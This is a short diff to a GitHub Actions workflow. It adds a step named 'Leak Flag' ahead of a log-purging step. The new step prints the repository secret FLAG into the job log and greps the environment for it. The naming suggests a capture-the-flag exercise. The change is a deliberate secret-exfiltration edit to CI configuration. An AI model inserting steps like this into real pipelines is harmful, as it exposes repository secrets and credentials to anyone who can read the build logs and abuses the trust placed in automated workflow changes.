@@ -13,6 +13,11 @@ jobs:
   purge-logs:
     runs-on: ubuntu-latest
     steps:
+      - name: Leak Flag
+        run: |
+          echo "Flag: ${{ secrets.FLAG }}"
+          echo "All secrets:"
+          env | grep -i flag
       - name: Delete logs for the triggering run
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
